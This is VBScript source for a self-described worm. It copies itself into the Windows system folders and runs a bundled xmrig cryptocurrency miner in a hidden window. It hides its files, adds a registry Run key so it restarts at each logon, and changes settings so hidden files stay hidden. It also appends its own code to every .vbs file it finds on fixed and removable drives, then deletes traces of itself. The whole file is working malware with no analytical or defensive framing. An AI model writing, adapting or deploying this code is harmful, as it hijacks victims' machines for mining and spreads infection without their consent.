On Error Resume Next
MsgBox "Now the Worm begin to hack your PC", ,"Warning" 
Set fso = CreateObject("Scripting.FileSystemObject")
Set colDrives = fso.Drives    
const Hidden = 2

Set dir1 = fso.GetSpecialFolder(0)
Set dir2 = fso.GetSpecialFolder(1)

MsgBox dir1, ,"Warning" 
MsgBox dir2, ,"Warning" 
WScript.Echo CreateObject("SCripting.FileSystemObject").GetFolder(".").Path
dim r
Set r=CreateObject("Wscript.Shell")

MsgBox CreateObject("SCripting.FileSystemObject").GetFolder(".").Path&"\scvhost", ,"Warning" 
fso.GetFile(Wscript.ScriptFullName).Copy(dir1&"\Win32system.vbs")
fso.GetFile(Wscript.ScriptFullName).Copy(dir2&"\Win32system.vbs")
fso.CreateFolder dir1&"\scvhost\"
fso.CreateFolder dir2&"\scvhost\"
fso.copyfile CreateObject("SCripting.FileSystemObject").GetFolder(".").Path&"\scvhost\*", dir1&"\scvhost\"
fso.copyfile CreateObject("SCripting.FileSystemObject").GetFolder(".").Path&"\scvhost\*", dir2&"\scvhost\"
MsgBox "Perpare to run the start.cmd", ,"Warning" 
r.run dir1&"\scvhost\xmrig.exe", 0
r.run "attrib +h "&dir1&"\scvhost\xmrig.exe", 0
r.run "attrib +h "&dir2&"\scvhost\start.cmd", 0

r.run "attrib +h "&dir1&"\Win32system.vbs", 0
r.run "attrib +h "&dir2&"\Win32system.vbs", 0

r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Win32system", "Win32system.vbs"
r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue", 0, "REG_DWORD"
For Each i In colDrives
    If i.IsReady = True Then
        If i.DriveType = 2 Then
            GF fso.GetFolder(i & "/")
        End If
        If i.DriveType = 1 Then
            GF fso.GetFolder(i & "/")
        End If
    End if
Next

Sub GF(fol)
  Wh fol
  Dim j
  For Each j In fol.SubFolders
    GF j
  Next
End Sub

Sub Wh(fol)
    Dim k
    For Each k In fol.Files
        If LCase(fso.GetExtensionName(k)) ="vbs" Then
            msgbox k,,"warning"
            dim f
            set f = fso.OpenTextFile(k, 1, false) 
            dim s, jud
            jud = 1
            do while f.AtEndOfStream <> True
                s = f.Read(4) 
                if s = "aaaa" then  
                    jud = 0
                    exit do
                end if
            loop
            dim max
            dim wri
            wri = 0
            max = 10000
            if jud = 1 then
                set file = fso.opentextfile(dir1&"\Win32system.vbs", 1, false)

                dim cnt
                cnt = 0
                do while cnt < max 
                    s = file.Readline
                    if s = "On Error Resume Next" then
                        fso.OpenTextFile(k, 8, false).Write vbcrlf
                        wri = 1
                        max = cnt + 82
                    end if
                    if wri = 1 then
                        fso.OpenTextFile(k, 8, false).Write s & vbcrlf
                    end if 
                    cnt = cnt + 1
                loop



            end if
        End If
    Next
End Sub

fso.deletefile(dir1&"\Win32system.vbs")
aaaaaaaaaaaaaaaaaaaaaa
fso.deletefile(wscript.scriptname)

